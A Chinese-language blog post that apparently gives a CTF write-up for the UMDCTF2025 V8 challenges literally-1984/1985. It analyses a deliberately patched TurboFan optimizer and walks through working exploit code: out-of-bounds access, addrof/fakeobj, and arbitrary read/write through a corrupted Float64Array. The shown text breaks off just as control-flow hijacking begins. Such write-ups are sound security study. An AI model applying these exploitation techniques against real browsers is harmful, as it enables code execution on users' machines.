<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Loora1N">



    <meta name="description" content="Blog of Loora1N">





<title>【V8】UMDCTF2025 literally-1984/1985 | Loora1N&#39;s Blog | 鹭雨</title>



    <link rel="icon" href="/favicon.ico">



<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
</style>



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    




    <!-- scripts list from _config.yml -->
    
    <script src="/js/menu.js"></script>
    
    <script src="/js/highlight.min.js"></script>
    
    <script src="/js/highlightjs-line-numbers.js"></script>
    
    <script src="/js/format.js"></script>
    
    <script src="/js/search.js"></script>
    




    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>




    <script src='https://unpkg.com/valine@1.4.16/dist/Valine.min.js'></script>




  <meta name="generator" content="Hexo 6.2.0"></head>
  <body>
    <div class="mask-border">
    </div>

    <div class="wrapper">

      <div class="header">
  <div class="flex-container">
    <div class="header-inner">
      <div class="site-brand-container">
        <a href="/">
          
            Loora1N&#39;s Blog | 鹭雨
          
        </a>
      </div>
      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
        Menu
      </div>
      <nav class="site-nav">
        <ul class="menu-list">
          
            
              <li class="menu-item">
                <a href="/">首页</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/archives/">索引</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/about/">述己</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/links/">友链</a>
              </li> 
                   
          
          
            <li class="menu-item search-btn">
              <a href="#">Search</a>
            </li>
          
        </ul>
      </nav>
    </div>
  </div>
</div>


      <div class="main">
        <div class="flex-container">
          <article id="post">

  
    <div class="post-head">
    <div class="post-info">
        <div class="tag-list">
            
        </div>
        <div class="post-title">
            
            
                【V8】UMDCTF2025 literally-1984/1985
            
            
        </div>
        <span class="post-date">
            6月 17, 2025
        </span>
    </div>
    <div class="post-img">
        
            <div class="h-line-primary"></div>
              
    </div>
</div>
    <div class="post-content">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是很久没有写文章了，终于一两天有空补一下前面几个月的坑。</p>
<p>本文是关于<strong>UMDCTF2025</strong>的两道V8-CTF题目的解题思路分享。由于1984本身存在非预期解， 1985本质只是1984的临时修复版。如果只考虑从patch出发的解题思路，其实并没有什么区别。</p>
<h2 id="literally-1984的非预期解"><a href="#literally-1984的非预期解" class="headerlink" title="literally-1984的非预期解"></a>literally-1984的非预期解</h2><p>既然存在非预期，我们就稍微提一下。如果对比一下两个题目的patch文件，就能发现一些特点</p>
<p><img src="/img/article/v8-umdctf/image-20250612094833243.png" alt="image-20250612094833243"></p>
<p>其实就是注释掉了一些全局的JS接口，这里我一个非预期exp仅供参考</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> content = <span class="title function_">read</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="title function_">print</span>(content);</span><br></pre></td></tr></table></figure>

<h2 id="literally-1985-Patch-分析"><a href="#literally-1985-Patch-分析" class="headerlink" title="literally-1985 Patch 分析"></a>literally-1985 Patch 分析</h2><p>首先来看一下patch的核心部分，其实也就是1984的patch内容</p>
<h3 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span></span><br><span class="line"><span class="comment">index 2da3715a58f..e6896555188 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/machine-operator-reducer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/machine-operator-reducer.cc</span></span><br><span class="line"><span class="meta">@@ -1101,6 +1101,11 @@</span> Reduction MachineOperatorReducer::ReduceInt32Add(Node* node) &#123;</span><br><span class="line">   DCHECK_EQ(IrOpcode::kInt32Add, node-&gt;opcode());</span><br><span class="line">   Int32BinopMatcher m(node);</span><br><span class="line">   if (m.right().Is(0)) return Replace(m.left().node());  // x + 0 =&gt; x</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (m.left().Is(2) &amp;&amp; m.right().Is(2)) &#123;</span></span><br><span class="line"><span class="addition">+    return ReplaceInt32(5);</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   if (m.IsFoldable()) &#123;  // K + K =&gt; K  (K stands for arbitrary constants)</span><br><span class="line">     return ReplaceInt32(base::AddWithWraparound(m.left().ResolvedValue(),</span><br><span class="line">                                                 m.right().ResolvedValue()));</span><br></pre></td></tr></table></figure>

<p>首先修改了<code>machine-operator-reducer.cc</code>中的<code>Reduction MachineOperatorReducer::ReduceInt32Add(Node* node)&#123;&#125;</code>。查看v8的源代码内容结合函数名称，我们大概能明白，这个部分是用来优化简化int32类型的算术加法</p>
<p><img src="/img/article/v8-umdctf/image-20250612102032276.png" alt="image-20250612102032276"></p>
<p>也就是说，patch本质上是加了一条<strong>2 + 2 &#x3D;&gt; 5</strong>的优化操作，当左右两个节点的值都为2时，直接被替换为数字5.</p>
<h3 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span></span><br><span class="line"><span class="comment">index 4cc858bb22c..1e0056e7130 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/simplified-lowering.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/simplified-lowering.cc</span></span><br><span class="line"><span class="meta">@@ -1993,7 +1993,7 @@</span> class RepresentationSelector &#123;</span><br><span class="line">             // The bounds check is redundant if we already know that</span><br><span class="line">             // the index is within the bounds of [0.0, length[.</span><br><span class="line">             // TODO(neis): Move this into TypedOptimization?</span><br><span class="line"><span class="deletion">-            if (v8_flags.turbo_typer_hardening) &#123;</span></span><br><span class="line"><span class="addition">+            if (v8_flags.turbo_typer_hardening &amp;&amp; 2 + 2 == 5) &#123;</span></span><br><span class="line">               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">               DeferReplacement(node, NodeProperties::GetValueInput(node, 0));</span><br></pre></td></tr></table></figure>

<p>Patch的第二个部分修改了对于index越界访问的校验。从注释我们也能明白</p>
<blockquote>
<p>The bounds check is redundant if we already know that the index is within the bounds of [0.0, length[.</p>
<p>如果我们已经知道index访问的范围在0.0 - length之间，那么边界检查就比较多余了</p>
</blockquote>
<p>重点在于<code>if (v8_flags.turbo_typer_hardening) &#123;</code> &#x3D;&#x3D;&gt; <code>if (v8_flags.turbo_typer_hardening &amp;&amp; 2 + 2 == 5) &#123;</code></p>
<p>由于第一个patch影响的是turbofan优化的Javascript层面的2+2，而这里源代码的2+2&#x3D;5是不受影响的。也就是说，这个if判断变为了一个恒为<strong>False</strong>的情况，使得new_flags永远不会拥有<strong>CheckBoundsFlag::kAbortOnOutOfBounds</strong>标志位。</p>
<blockquote>
<p><strong>CheckBoundsFlag::kAbortOnOutOfBounds</strong>：告诉编译器在访问数组时如果发现索引越界，应立即“强制终止”（abort）程序，而不是继续执行或返回默认值。</p>
<ul>
<li><p>具体作用流程：</p>
<ul>
<li><p>需要对某个数组访问加一个边界检查；</p>
</li>
<li><p>如果发现数组索引超出了范围；</p>
</li>
<li><p>那就 <strong>触发一个安全终止（abort）</strong>，而不是容忍它或 fallback 到解释器。</p>
</li>
</ul>
</li>
</ul>
</blockquote>
<p>总体来说，这段patch就是防止了程序从越界访问时触发错误终止。</p>
<h2 id="2-2-x3D-5"><a href="#2-2-x3D-5" class="headerlink" title="2+2&#x3D;5?"></a>2+2&#x3D;5?</h2><p>分析完了Patch，我们很显然能够意识到，出题人为我们提供了一个数组越界的风险。那么接下来就需要尝试构造并验证<strong>2+2&#x3D;5</strong>，最终实现数组越界的效果。</p>
<p>直观来想，我构造的第一个poc函数如下:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> idx;</span><br><span class="line">    <span class="keyword">let</span> a=<span class="number">2</span>, b =<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> victim = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">        idx = a + b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> victim[idx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并通过在外层主流程循环调用来触发Turbofan优化</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">foo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如下图：</p>
<p><img src="/img/article/v8-umdctf/image-20250612111742943.png" alt="image-20250612111742943"></p>
<p><img src="/img/article/v8-umdctf/image-20250612111753271.png" alt="image-20250612111753271"></p>
<p>能够成功的泄露内存值，为了更进一步查看泄露的内存值，略微修改函数返回值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> <span class="keyword">return</span> [idx, victim[idx], victim];</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>关注红框的内容，可以看到最下面的输出时idx &#x3D; 5 以及leak的内存信息</p>
<p><img src="/img/article/v8-umdctf/image-20250612135207130.png" alt="image-20250612135207130"></p>
<p>同时由于elements的内存布局，这里泄露的值恰好为<strong>JSArray</strong>对象的<strong>map</strong>和<strong>properties</strong>域。到此为止，我们便可以正式开始漏洞利用的过程。</p>
<h2 id="错误的AAR-amp-AAW"><a href="#错误的AAR-amp-AAW" class="headerlink" title="错误的AAR &amp; AAW"></a>错误的AAR &amp; AAW</h2><p>我们知道，V8对于数组越界的判断是基于计算一个索引属于[x, y]这样的集合上下界来判断的。我们已经有了能够让<strong>2+2 &#x3D;&gt; 5</strong>的能力，从而实现短距越界的效果。如果想要任意地址读或者任意地址写，最好的办法便是扩大越界范围，以修改elements导向，从而实现任意地址读写。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> idx;</span><br><span class="line">    <span class="keyword">let</span> a=<span class="number">2</span>, b =<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> victim = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">        idx = a + b;</span><br><span class="line">        idx = idx - <span class="number">2</span>; <span class="comment">// 4-2 =&gt; 2 ; 5-2 =&gt; 3</span></span><br><span class="line">        idx = idx * <span class="number">2</span>; <span class="comment">//2*2 =&gt; 4; 3*2 =&gt; 6</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [idx, victim[idx], victim];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需简单的借助乘法便可以实现对于elements的越界访问</p>
<h3 id=""><a href="#" class="headerlink" title=""></a><img src="/img/article/v8-umdctf/image-20250612154115143.png" alt="image-20250612154115143"></h3><p>如果此时覆盖elements到指定地址，便可轻易实现AAW与AAR，如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前面的其余数据处理函数省略掉</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">target = <span class="number">6.6</span></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> idx;</span><br><span class="line">    <span class="keyword">let</span> a=<span class="number">2</span>, b =<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> victim = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">        idx = a + b;</span><br><span class="line">        idx = idx - <span class="number">2</span>; <span class="comment">// 4-2 =&gt; 2 ; 5-2 =&gt; 3</span></span><br><span class="line">        idx = idx * <span class="number">2</span>; <span class="comment">//2*2 =&gt; 4; 3*2 =&gt; 6</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    victim[idx] = target;</span><br><span class="line">    <span class="keyword">return</span> [idx, victim[idx], victim];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">foo</span>();</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">foo</span>(<span class="title function_">i2f</span>(<span class="number">0xdeadbeefn</span>));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(res[<span class="number">2</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res[<span class="number">0</span>], <span class="title function_">hex</span>(<span class="title function_">f2i</span>(res[<span class="number">1</span>])));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>



<p><img src="/img/article/v8-umdctf/image-20250612154422774.png" alt="image-20250612154422774"></p>
<p>写到这里时，我天真得以为这样就可以轻松实现任意地址读写，然而实际是这样的</p>
<p><img src="/img/article/v8-umdctf/image-20250616145712136-1750065704195-2.png" alt="image-20250616145712136"></p>
<p>本质是由于增添了一个CHECK，用来校验elements对象的map是否符合预期。如果顺利的话我会在后续的文章中具体分析，并尝试提出新的通用利用链。（因为elements的校验会影响fake_array的伪造，使得常用的基于fake_array的任意地址读写手法无法正常运行）</p>
<h2 id="From-JSTypedArray-to-AAR-amp-AAW"><a href="#From-JSTypedArray-to-AAR-amp-AAW" class="headerlink" title="From JSTypedArray to AAR &amp; AAW"></a>From JSTypedArray to AAR &amp; AAW</h2><p>我在Discord上看到了一个比较巧妙的优化方式来自@white701</p>
<p><img src="/img/article/v8-umdctf/image-20250617101529945.png" alt="image-20250617101529945"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + x;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">        res = <span class="title function_">foo</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> corrupting_array = [<span class="number">0.1</span>, <span class="number">0.1</span>];</span><br><span class="line">    <span class="keyword">let</span> corrupted_array = [<span class="number">0.1</span>,<span class="number">0.1</span>,<span class="number">0.1</span>];</span><br><span class="line">    <span class="keyword">let</span> buf_array = [&#123;&#125;];</span><br><span class="line">    overwrite = <span class="title function_">ftoi</span>(corrupting_array[(res-<span class="number">4</span>)*<span class="number">7</span>]) + <span class="number">0x1000_0000_0000n</span>;</span><br><span class="line">    corrupting_array[(res-<span class="number">4</span>)*<span class="number">7</span>] = <span class="title function_">itof</span>(overwrite); <span class="comment">//overwirte corrupted_array --&gt; length</span></span><br><span class="line">    overwrite = <span class="title function_">ftoi</span>(corrupting_array[(res-<span class="number">4</span>)*<span class="number">2</span>]) + <span class="number">0x1000_0000_0000n</span>;</span><br><span class="line">    corrupting_array[(res-<span class="number">4</span>)*<span class="number">2</span>] = <span class="title function_">itof</span>(overwrite); <span class="comment">//overwrite corrupted_array --&gt; elements --&gt; length </span></span><br><span class="line">    <span class="keyword">return</span> [corrupted_array, buf_array];</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">let</span> o;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; <span class="number">1000</span>; index++) &#123;</span><br><span class="line">    </span><br><span class="line">    o = <span class="title function_">test</span>();</span><br><span class="line">    <span class="keyword">if</span> (o[<span class="number">0</span>].<span class="property">length</span> != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过越界更改corrupted_array的length和corrupted_array.elements的length，而并非更改elements指针的指向。从而可以使得corrupting数组稳定的越界buf_array对象数组。另外，在外层循环通过<code>if (o[0].length != 3) break;</code>来定位优化完成的时刻。</p>
<blockquote>
<p>因为如果test没有正确进行Turbofan优化，其中的赋值语句显然不会更改corrupted_array的长度。</p>
</blockquote>
<p>自然的，有了这样o[0]和o[1]这样稳定的越界读写对象数组，<code>GetAddressOf()</code>和<code>GetFakeObject()</code>的实现就显的很轻松了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    o[<span class="number">1</span>][<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">9</span>])&gt;&gt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">9</span>] = <span class="title function_">itof</span>((addr&lt;&lt;<span class="number">32n</span>) + <span class="number">2n</span>);</span><br><span class="line">    <span class="keyword">return</span> o[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在无法正常使用<strong>fake_array</strong>的情况下，我们应当如何实现AAW或者AAR原语，这里就要用到标题中提到的<strong>JSTypedArray</strong>，先来看看对象结构:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> leakArr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(leakArr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>简要信息如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: <span class="number">0x24c10007a331</span>: [JSTypedArray]</span><br><span class="line">...</span><br><span class="line"> - elements: <span class="number">0x24c10007a321</span> &lt;ByteArray[<span class="number">8</span>]&gt; [FLOAT64ELEMENTS]</span><br><span class="line"> - buffer: <span class="number">0x24c10007a2e9</span> &lt;ArrayBuffer map = <span class="number">0x24c10018be75</span>&gt;</span><br><span class="line"> - byte_offset: <span class="number">0</span></span><br><span class="line"> - byte_length: <span class="number">8</span></span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - data_ptr: <span class="number">0x24c10007a328</span></span><br><span class="line">   - base_pointer: <span class="number">0x7a321</span></span><br><span class="line">   - external_pointer: <span class="number">0x24c100000007</span></span><br><span class="line"> - properties: <span class="number">0x24c100000745</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x24c10007a321</span> &lt;ByteArray[<span class="number">8</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">0</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>wx <span class="number">0x24c10007a331</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x24c10007a330</span>: <span class="number">0x00182b35</span>      <span class="number">0x00000745</span>      <span class="number">0x0007a321</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x24c10007a340</span>: <span class="number">0x0007a2e9</span>      <span class="number">0x00000010</span>      <span class="number">0x00000000</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x24c10007a350</span>: <span class="number">0x00000008</span>      <span class="number">0x00000000</span>      <span class="number">0x00000001</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x24c10007a360</span>: <span class="number">0x00000007</span>      <span class="number">0x000024c1</span>      <span class="number">0x0007a321</span>      <span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x24c10007a370</span>: <span class="number">0xbeadbeef</span>      <span class="number">0xbeadbeef</span>      <span class="number">0xbeadbeef</span>      <span class="number">0xbeadbeef</span></span><br></pre></td></tr></table></figure>

<p>其中<strong>data_ptr</strong>指向的便是数据存储的直接存储空间，目标地址无需满足特定对象结构，且<strong>data_ptr &#x3D; base_pointer + external_pointer</strong>。</p>
<blockquote>
<p>具体来讲data_ptr有时与elements相关，有时与buffer相关，取决于当前的存储是<strong>inline</strong>还是<strong>external</strong>。如果顺利的话这段具体的详情，我们也放到下一篇文章内。</p>
<p>小小吐槽：写到这里突然发现欠了很多文章没有完成，只能慢慢补了</p>
</blockquote>
<p>且<strong>base_pointer</strong>和<strong>external_poniter</strong>的完整信息都存储在对象内存结构内，那么我们只要利用越界读写，覆盖这两个域。便能够控制<strong>data_ptr</strong>指向任意原始指针范围，从而实现64bit的任意地址读写。</p>
<p>那么AAW和AAR也就呼之欲出了:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> leakArr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">1n</span>) &#123;</span><br><span class="line">      addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr -= <span class="number">7n</span>;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">58</span>] =  <span class="title function_">itof</span>((<span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">58</span>])&amp;<span class="number">0xffffffff00000000n</span>) + addr);<span class="comment">//覆盖leakArr--&gt;base_pointer</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftoi</span>(leakArr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">1n</span>) &#123;</span><br><span class="line">      addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr -= <span class="number">7n</span>;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">58</span>] =  <span class="title function_">itof</span>((<span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">58</span>])&amp;<span class="number">0xffffffff00000000n</span>) + addr);<span class="comment">//覆盖leakArr--&gt;base_pointer</span></span><br><span class="line"></span><br><span class="line">    leakArr[<span class="number">0</span>] = <span class="title function_">itof</span>(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的58偏移需要具体通过<code>%DebugPrint()</code>来计算具体偏移值是多少即可。这里的<code>-7n</code>就是为了和<strong>external_pointer</strong>做累加实现堆内的任意地址读写。因为后面只需要更改<strong>wasm.Instance</strong>对象的跳转表，所以堆内任意地址读写就已经足够。</p>
<h2 id="控制执行流"><a href="#控制执行流" class="headerlink" title="控制执行流"></a>控制执行流</h2><blockquote>
<p>这里我对原作者的EXP做了一些更改和优化，因为利用并不需要他写的这么复杂，在文末我会放出优化后的完整EXP和原EXP以供参考</p>
</blockquote>
<p>这里使用的shellcode是return浮点数利用Turbofan优化后的汇编码，可以看这条：<a target="_blank" rel="noopener" href="https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-maglev/#jit-spraying-shellcode">JIT-Spary</a></p>
